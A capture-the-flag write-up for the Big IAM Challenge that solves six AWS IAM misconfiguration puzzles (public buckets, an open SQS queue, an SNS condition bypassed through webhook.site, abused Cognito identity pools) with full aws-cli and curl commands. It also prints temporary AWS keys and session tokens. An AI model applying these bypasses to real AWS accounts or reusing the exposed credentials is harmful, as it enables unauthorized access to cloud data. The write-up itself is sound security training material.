---
description: https://bigiamchallenge.com/
cover: ../../.gitbook/assets/Big IAM.png
coverY: 0
---

# The BIG IAM Challenge writeup

## Challenge 1 - Buckets of Fun

> We all know that public buckets are risky. But can you find the flag?

{% code title="IAM Policy" overflow="wrap" %}
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::thebigiamchallenge-storage-9979f4b/*"
        },
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:ListBucket",
            "Resource": "arn:aws:s3:::thebigiamchallenge-storage-9979f4b",
            "Condition": {
                "StringLike": {
                    "s3:prefix": "files/*"
                }
            }
        }
    ]
}
```
{% endcode %}

From the IAM policy we can see that anyone can download or List an object from the bucket `thebigiamchallenge-storage-9979f4b`&#x20;

You can use the terminal provided in the same page itself to execute and test out the commands

```bash
> aws s3 ls s3://thebigiamchallenge-storage-9979f4b/files/
2023-06-05 19:13:53         37 flag1.txt
2023-06-08 19:18:24      81889 logo.png

> aws s3 cp s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt -
{wiz:exposed-storage-risky-as-usual}
```

## Challenge 2 - ~~Google~~ Analytics

> We created our own analytics system specifically for this challenge. We think it's so good that we even used it on this page. What could go wrong?
>
> Join our queue and get the secret flag.

{% code title="IAM Policy" overflow="wrap" %}
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": [
                "sqs:SendMessage",
                "sqs:ReceiveMessage"
            ],
            "Resource": "arn:aws:sqs:us-east-1:092297851374:wiz-tbic-analytics-sqs-queue-ca7a1b2"
        }
    ]
}
```
{% endcode %}

From the IAM policy we'll be able to send and receive SQS messages from `wiz-tbic-analytics-sqs-queue-ca7a1b2` .&#x20;

A queue URL in terms of AWS refers to a unique URL that is used to access a queue within the Amazon Simple Queue Service . Lets see if receive any message by forming a queue URL

{% code overflow="wrap" %}
```bash
> aws sqs receive-message --queue-url https://sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2
{
    "Messages": [
        {
            "MessageId": "c451d297-986c-4648-822a-60956ddcc497",
            "ReceiptHandle": "AQEBrO6F0xkzafMfOJX7VlnLRAOyt87sjvPfIDKcuzn/FOMFZnyx2A9mo6P9HQuSZbxHymiwFhwFj28MqJRMprjYwhilVWlfQP1DlMFm0BIPmrMdAwmwZq/fW5UVfIx/BCUVt4uwkfdsuKb
Hg/tNDUzdhsjS579K3/Vu5pxc5CbU0wAftpf+YB7i0kwriSiZI8/4fx9CWvlQ9tlsyAje7b5SERhT9a815oVnrTp7dCiX/1rdh3zRJLds+1eFjHngWeSq8lAOZ1PaakES14wYwEZ0DQObL6Ga8iMCvX0K0D84twgBmYlWKfod84tJ
KN0822zBdM6PaCHekoe2yl8bCQfCgTzRsPKgFMJ3bgvh+0gscvq1Ddmur6td/3IXEymjSmtFHLBuEoE999qSDVgC8eObDEBcABnVP2uqY+FX7kxaQWI=",
            "MD5OfBody": "4cb94e2bb71dbd5de6372f7eaea5c3fd",
            "Body": "{\"URL\": \"https://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html\", \"User-Agent\": \"Lynx/2.5329.3258dev.35046 libwww-FM/2.14 SSL
-MM/1.4.3714\", \"IsAdmin\": true}"
        }
    ]
}
```
{% endcode %}

In the received message we can see a URL, we can check it out by simply using curl

```bash
> curl https://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html
{wiz:you-are-at-the-front-of-the-queue}
```

## Challenge 3 - Enable Push Notifications

> &#x20;We got a message for you. Can you get it?

{% code title="IAM Policy" overflow="wrap" %}
```json
{
    "Version": "2008-10-17",
    "Id": "Statement1",
    "Statement": [
        {
            "Sid": "Statement1",
            "Effect": "Allow",
            "Principal": {
                "AWS": "*"
            },
            "Action": "SNS:Subscribe",
            "Resource": "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications",
            "Condition": {
                "StringLike": {
                    "sns:Endpoint": "*@tbic.wiz.io"
                }
            }
        }
    ]
}
```
{% endcode %}

From the policy we can see that anyone is allowed to subscribe to notifications from `TBICWizPushNotifications` on one condition which is the endpoint should end with `@tbic.wiz.io`&#x20;

As we do not have an email ending in that domain we can use another protocol like HTTPS to subscribe to it using webhooks. ([https://webhook.site](https://webhook.site))&#x20;

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"><strong>> aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol https --notification-endpoint https://webhook.site/{your-assigend-id}/@tbic.wiz.io
</strong></code></pre>

In the webhook dashboard you can see a POST notification for Subscription confirmation, To confirm the subscription to the notifications visit the URL from SubscribeURL in the confirmation message. You'll receive the flag as the message once you confirm

## Challenge 4 - Admin only?

> We learned from our mistakes from the past. Now our bucket only allows access to one specific admin user. Or does it?

{% code title="IAM Policy" overflow="wrap" %}
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321/*"
        },
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:ListBucket",
            "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321",
            "Condition": {
                "StringLike": {
                    "s3:prefix": "files/*"
                },
                "ForAllValues:StringLike": {
                    "aws:PrincipalArn": "arn:aws:iam::133713371337:user/admin"
                }
            }
        }
    ]
}
```
{% endcode %}

The policy allows anyone to download objects from the bucket `thebigiamchallenge-admin-storage-abf1321` and anyone can list the objects on the condition that the prefix should be `files/*` and the user arn is `arn:aws:iam::133713371337:user/admin`

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"><strong>> curl "https://s3.amazonaws.com/thebigiamchallenge-admin-storage-abf1321?prefix=files/"
</strong>&#x3C;ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/">&#x3C;Name>thebigiamchallenge-admin-storage-abf1321&#x3C;/Name>&#x3C;Prefix>files/&#x3C;/Prefix>&#x3C;Marker>&#x3C;/Marker>&#x3C;MaxKeys>1000&#x3C;
/MaxKeys>&#x3C;IsTruncated>false&#x3C;/IsTruncated>
&#x3C;Contents>
    &#x3C;Key>files/flag-as-admin.txt&#x3C;/Key>
    &#x3C;LastModified>2023-06-07T19:15:43.000Z&#x3C;/LastModified>
    &#x3C;ETag>"e365cfa7365164c05d7a9c209c4d8514"&#x3C;/ETag>
    &#x3C;Size>42&#x3C;/Size>
    &#x3C;StorageClass>STANDARD&#x3C;/StorageClass>
&#x3C;/Contents>
&#x3C;Contents>
    &#x3C;Key>files/logo-admin.png&#x3C;/Key>
    &#x3C;LastModified>2023-06-08T19:20:01.000Z&#x3C;/LastModified>
    &#x3C;ETag>"c57e95e6d6c138818bf38daac6216356"&#x3C;/ETag>
    &#x3C;Size>81889&#x3C;/Size>
    &#x3C;StorageClass>STANDARD&#x3C;/StorageClass>
&#x3C;/Contents>&#x3C;/ListBucketResult>
</code></pre>

From the response we can see that  there are 2 objects we can get out of which one is the flag

{% code overflow="wrap" %}
```bash
>  curl "https://s3.amazonaws.com/thebigiamchallenge-admin-storage-abf1321/files/flag-as-admin.txt"
{wiz:principal-arn-is-not-what-you-think}
```
{% endcode %}

## Challenge 5 - Do I know you?

> We configured AWS Cognito as our main identity provider. Let's hope we didn't make any mistakes.

{% code title="IAM Policy" overflow="wrap" %}
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "VisualEditor0",
            "Effect": "Allow",
            "Action": [
                "mobileanalytics:PutEvents",
                "cognito-sync:*"
            ],
            "Resource": "*"
        },
        {
            "Sid": "VisualEditor1",
            "Effect": "Allow",
            "Action": [
                "s3:GetObject",
                "s3:ListBucket"
            ],
            "Resource": [
                "arn:aws:s3:::wiz-privatefiles",
                "arn:aws:s3:::wiz-privatefiles/*"
            ]
        }
    ]
}
```
{% endcode %}

We can see that the policy allows all actions within the Cognito Sync Service. Allows to download and list any object from the bucket `wiz-privatefiles`

We know that the Cognito Service is being used but we need to find the identity pool id to make calls to the application. The AWS cognito image you see on the screen is being hosted on the wiz-privatefiles bucket we can see that if we open the image in a new tab. If you check the source code of the challenge page we can find the Cognito Service creds.

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

You can open devtools and the check config creds in console

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
> export AWS_ACCESS_KEY_ID=ASIARK7LBOHXNHWZMNND
> export AWS_SECRET_ACCESS_KEY=OPjlNuyCNTpj2UohVcDf6/Syar41V5EIlfPwH7jI
> export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEIL//////////wEaCXVzLWVhc3QtMSJIMEYCIQCoDXsQsUfotjzYG72qTqiSkr35fNsdbMbUsrmj21Wc8gIhAK0YkgfsQgzlqFS5eCdzX2dbO6PkA41ibj5Vrf5nkeSTKrkFCOv//////////wEQABoMMDkyMjk3ODUxMzc0Igw7iToQRCB6Kp0/0NEqjQUxVe1Q8WVa0mHWMSqUJcv1dFhgIDJbXt55kmFKagNCb0cBGjww1XYdIJbAML98CYuhncEg92H+iB2OoW6eAaxQl34LHyq81m4yvAqXIJ4hACLE6JgEcikf63mp4o109CCnnlyipZInMJROI3eSQqecyQ4ZvkBsqZ6mWtN6K+rO7bvSu58nB+wxSJ8CeedgglaN/0N34145O2+Ac0qm6r7lGvXJ7p+zNdOpNUOwNR8r1UXyvdrADiA5+AAVY+1eRoAA/OH+N6Ooa3dGQKIxQZsBjzLaofbla5fxAh7AAMt7Sd/MB2GDeL116KDGXtrU8HJZqmG0amQqmeCin6UikjlMNwsJykgjtSIAzxjkgi4q53n4BUfD95LqSeIgxAVxQvM3kwWNndqgZwLXynupmkuueVm/1Gm40bcMpUXWZHGIBITOU33X4J2xwwqAomokklCx1Iq/BzTF8+F2Jle+Qb+yBvmtSK31MVmgz7zRTqdPmPAVCe/xaGTT7tEdsjawRS3urauW38QVDNtMg/+YYOcMKiEV9yA909Ep07kBcY70bHJJi4LScHfT2YN3U68aWpbJNKxVxsUBZAhMBHytBUUbeDAfxMDd8QHWwlRvAY1au4bNxf3+83NGGY+2H3ruTEO7Abasbmps26zUSCo/9bDbN+OkdWxxQJfwyHufHn4kufLIRXia5h9EnZEUqJhpoTS6xTo1/TUTq1CJL9HvkrNloZ/5o6HsOokapfQb5MnADSyYhgKJYeld0bGOCwASKbhbAmirm8SHtVxbMbBoJ0AjvwO3YJbDGwlsUSqehGRuT1+Y0wrI95QWU+DMfRH+NnZ+Cive1xWCNnhjizoQw8dCKJLwpbcTHSqCzuGsrDDBtrm/BjrdAuOngt2uRNeXzyJoPjnVfxPwhzOi/hcs/blRZAcPmXOesVGbWl1UMBjGEuPFozzMa3MEpMtVMzBnWBpk1gNZuj7IWNT3GfMVUJhkKyw55/BQgjtQ/Fnjxngf6/ybLwXz59h87j/OMr4D4g5HCB0pEYJtJ0TVFa8oh8OL8fWNNdNF32l8Ik+nlFod7ix5ctwizQBSgqdtkbucdGIywkKJol27ySMF8h7kvQoQDVHUHye7Q8KrWmo1qAxfaSxf/WvK2h43FmYrJ1PO+jHZdrJ0g4cnpIdzqwlGaus2k4FRIH0F112E3eqLbcn2RIOMGx0cpvJqmXwkVDPXv1MQENmXSdJMqauY/TojZRLsPMrFUVo5EGGkLtx3fqXXzMXH3AcHYyWsp7DIb7pTXk7nv0EJ5VT+yBgI72LER1MDCbCzI317X192MyBjKt53YV6DDorhiQ/opW0Vy5/33DnYD/k=

> aws s3 ls s3://wiz-privatefiles/
2023-06-06 01:12:27       4220 cognito1.png
2023-06-05 18:58:35         37 flag1.txt

> aws s3 cp s3://wiz-privatefiles/flag1.txt -
{wiz:incognito-is-always-suspicious}
```

## Challenge 6 - One final push

> Anonymous access no more. Let's see what can you do now.
>
> Now try it with the authenticated role: _arn:aws:iam::092297851374:role/Cognito\_s3accessAuth\_Role_

{% code title="IAM Policy" %}
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "Federated": "cognito-identity.amazonaws.com"
            },
            "Action": "sts:AssumeRoleWithWebIdentity",
            "Condition": {
                "StringEquals": {
                    "cognito-identity.amazonaws.com:aud": "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
                }
            }
        }
    ]
}
```
{% endcode %}

This IAM policy allows identity `us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b` to assume role.

```bash
> aws cognito-identity get-id --region us-east-1 --identity-pool-id us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b
{
    "IdentityId": "us-east-1:157d6171-ee1b-c968-98c2-7c97c13d98d2"
}

> aws cognito-identity get-open-id-token --region us-east-1 --identity-id us-east-1:157d6171-ee1b-c968-98c2-7c97c13d98d2
{
    "IdentityId": "us-east-1:157d6171-ee1b-c968-98c2-7c97c13d98d2",
    "Token": "eyJraWQiOiJ1cy1lYXN0LTEtNyIsInR5cCI6IkpXUyIsImFsZyI6IlJTNTEyIn0.eyJzdWIiOiJ1cy1lYXN0LTE6MTU3ZDYxNzEtZWUxYi1jOTY4LTk4YzItN2M5N2MxM2Q5OGQyIiwiYXVkIjoidXMtZWFzdC0
xOmI3M2NiMmQyLTBkMDAtNGU3Ny04ZTgwLWY5OWQ5YzEzZGEzYiIsImFtciI6WyJ1bmF1dGhlbnRpY2F0ZWQiXSwiaXNzIjoiaHR0cHM6Ly9jb2duaXRvLWlkZW50aXR5LmFtYXpvbmF3cy5jb20iLCJleHAiOjE3NDM2Nzc0NjEs
ImlhdCI6MTc0MzY3Njg2MX0.luizXdcTC1LynFdtYdMBgaRZPFTLLLUPUsQePAuCG6P9IIXMZb7RwYw4RsDhHDwWB9H9T4Ln6gmnDHmyGIzxhuswMoX9DMHT_z8ckkEpxLJv63Bl4AXtiFmvdzBanfIpog9mEC80C-iYnHvUmWuoD
l7pwC6b1wCN4MgYwmxtByTDiUxSUNGxnHycfx8mebQlYuZG549EXGP_Av9vlJsfeakW4uv8XgvGkFXOQ69XxrHuz6NFQjBBfloF9M6WiuA7AJUHDtcNWWL9_jfcrZcIHJP1bZNyIS3J2VRnmD_HJX_C0qxlEhrhh1H80T0RzSvnZn
1sv8sji9EVRAoLJ3aXKw"
}

> aws sts assume-role-with-web-identity --role-arn arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role --role-session-name iam-challenge-6 --web-identity-token 'eyJraWQiOiJ1cy1lYXN0LTEtNyIsInR5cCI6IkpXUyIsImFsZyI6IlJTNTEyIn0.eyJzdWIiOiJ1cy1lYXN0LTE6MTU3ZDYxNzEtZWUxYi1jOTY4LTk4YzItN2M5N2MxM2Q5OGQyIiwiYXVkIjoidXMtZWFzdC0xOmI3M2NiMmQyLTBkMDAtNGU3Ny04ZTgwLWY5OWQ5YzEzZGEzYiIsImFtciI6WyJ1bmF1dGhlbnRpY2F0ZWQiXSwiaXNzIjoiaHR0cHM6Ly9jb2duaXRvLWlkZW50aXR5LmFtYXpvbmF3cy5jb20iLCJleHAiOjE3NDM2Nzc0NjEsImlhdCI6MTc0MzY3Njg2MX0.luizXdcTC1LynFdtYdMBgaRZPFTLLLUPUsQePAuCG6P9IIXMZb7RwYw4RsDhHDwWB9H9T4Ln6gmnDHmyGIzxhuswMoX9DMHT_z8ckkEpxLJv63Bl4AXtiFmvdzBanfIpog9mEC80C-iYnHvUmWuoDl7pwC6b1wCN4MgYwmxtByTDiUxSUNGxnHycfx8mebQlYuZG549EXGP_Av9vlJsfeakW4uv8XgvGkFXOQ69XxrHuz6NFQjBBfloF9M6WiuA7AJUHDtcNWWL9_jfcrZcIHJP1bZNyIS3J2VRnmD_HJX_C0qxlEhrhh1H80T0RzSvnZn1sv8sji9EVRAoLJ3aXKw'

{
    "Credentials": {
        "AccessKeyId": "ASIARK7LBOHXO6ND2IIP",
        "SecretAccessKey": "7OgOoiuJapQm9c0v5rQvwBTJcSsUEnV2KtxYi5jX",
        "SessionToken": "FwoGZXIvYXdzEJT//////////wEaDJLLOMPuMjxwgdShASKnAjhmrRQwjtwAsHJ8EP7wfIUQA5iJnqhR6CZLnmxFpqZrWhqgGXKpKXKzZj5k5hTz+C/szzN7/t8UWs9moDxv+SzuwOZpXJ7BofeMWAXQGA3VzRPVyuGP8Iaae+ft2MRDIaulxvIUV0RCwlP1RiPdjJIZV7lPBOiQV2VJdsmaR6SIG0t/SHlYvPAs45zZacjKuzmrVb67t9tT0lFUD6cZww0tAvhsQ4P7fPnpp5jt7mjInYfM7S0o9ejsR/9NXs3QPHixskH4gbmCQvFWcpwUcpxVAWz4eSKV/8ZZo46IXFAquY07CLSHVhxrc8u1P1sGyAnINICTVOziFMMyE//O8WXcV9XimJc00ODZQE986lQuP+Zk48+7iy43CCU6zgQMLR0LOqMAemsolsy5vwYylgF7lRa5XQae7IrU1gNAwFlpMa/mkAl0jE32RKY/m+NVuXfHYxXTNhL/3OLhPW4gNiBoCePJWn1NcZrAYr0hMGv22NiJ2V/uJKoOd1L1VOLz53I62q/57Sha72DO/ttVeIWPXJ+MOH7VZ57k7LCndoVansLxPRDqW5fZhpcBK+D/uQaycIgAQy4VQIqWitcdIeu7xSLCwgU=",
        "Expiration": "2025-04-03T11:42:30Z"
    },
    "SubjectFromWebIdentityToken": "us-east-1:157d6171-ee1b-c968-98c2-7c97c13d98d2",
    "AssumedRoleUser": {
        "AssumedRoleId": "AROARK7LBOHXASFTNOIZG:iam-challenge-6",
        "Arn": "arn:aws:sts::092297851374:assumed-role/Cognito_s3accessAuth_Role/iam-challenge-6"
    },
    "Provider": "cognito-identity.amazonaws.com",
    "Audience": "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
}

> export AWS_ACCESS_KEY_ID=ASIARK7LBOHXO6ND2IIP
> export AWS_SECRET_ACCESS_KEY=7OgOoiuJapQm9c0v5rQvwBTJcSsUEnV2KtxYi5jX
> export AWS_SESSION_TOKEN=FwoGZXIvYXdzEJT//////////wEaDJLLOMPuMjxwgdShASKnAjhmrRQwjtwAsHJ8EP7wfIUQA5iJnqhR6CZLnmxFpqZrWhqgGXKpKXKzZj5k5hTz+C/szzN7/t8UWs9moDxv+SzuwOZpXJ7BofeMWAXQGA3VzRPVyuGP8Iaae+ft2MRDIaulxvIUV0RCwlP1RiPdjJIZV7lPBOiQV2VJdsmaR6SIG0t/SHlYvPAs45zZacjKuzmrVb67t9tT0lFUD6cZww0tAvhsQ4P7fPnpp5jt7mjInYfM7S0o9ejsR/9NXs3QPHixskH4gbmCQvFWcpwUcpxVAWz4eSKV/8ZZo46IXFAquY07CLSHVhxrc8u1P1sGyAnINICTVOziFMMyE//O8WXcV9XimJc00ODZQE986lQuP+Zk48+7iy43CCU6zgQMLR0LOqMAemsolsy5vwYylgF7lRa5XQae7IrU1gNAwFlpMa/mkAl0jE32RKY/m+NVuXfHYxXTNhL/3OLhPW4gNiBoCePJWn1NcZrAYr0hMGv22NiJ2V/uJKoOd1L1VOLz53I62q/57Sha72DO/ttVeIWPXJ+MOH7VZ57k7LCndoVansLxPRDqW5fZhpcBK+D/uQaycIgAQy4VQIqWitcdIeu7xSLCwgU=


> aws s3 ls
2024-06-06 11:51:35 challenge-website-storage-1fa5073
2024-06-06 13:55:59 payments-system-cd6e4ba
2023-06-04 22:37:29 tbic-wiz-analytics-bucket-b44867f
2023-06-05 18:37:44 thebigiamchallenge-admin-storage-abf1321
2023-06-04 22:01:02 thebigiamchallenge-storage-9979f4b
2023-06-05 18:58:31 wiz-privatefiles
2023-06-05 18:58:31 wiz-privatefiles-x1000

> aws s3 ls wiz-privatefiles-x1000
2023-06-06 01:12:27       4220 cognito2.png
2023-06-05 18:58:35         40 flag2.txt

> aws s3 cp s3://wiz-privatefiles-x1000/flag2.txt -
{wiz:open-sesame-or-shell-i-say-openid}
```

<figure><img src="../../.gitbook/assets/Big IAM.png" alt=""><figcaption></figcaption></figure>
